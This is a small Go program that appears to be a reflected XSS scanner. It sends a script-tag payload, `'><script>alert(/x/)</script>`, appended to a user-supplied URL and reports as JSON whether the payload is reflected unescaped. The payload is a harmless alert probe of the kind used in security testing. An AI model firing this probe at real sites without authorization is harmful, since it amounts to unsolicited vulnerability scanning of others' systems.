package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/kirinlabs/HttpRequest"
	"os"
	"strings"
)

var bugname string = "反射型xss漏洞"

type xssCheckStruct struct {
	Urladdress string
	Bugname    string
	Bugpoc     string
}

func xssCheck(url string, poc string) {

	req := HttpRequest.NewRequest()
	res, err := req.Get(url + poc)

	if err != nil {
		fmt.Println(err)

	}

	body, err := res.Body()
	if strings.Count(string(body), poc) > 0 {
		xss_str := xssCheckStruct{url, bugname, poc}
		json_str, err := json.Marshal(xss_str)
		if err == nil {
			json_str = bytes.Replace(json_str, []byte("\\u003c"), []byte("<"), -1)
			json_str = bytes.Replace(json_str, []byte("\\u003e"), []byte(">"), -1)
			json_str = bytes.Replace(json_str, []byte("\\u0026"), []byte("&"), -1)
			fmt.Println(string(json_str))
		}
	}

}

func main() {

	pocList := []string{`'><script>alert(/x/)</script>`}
	for _, poc := range pocList {
		xssCheck(os.Args[1], poc)
	}
}
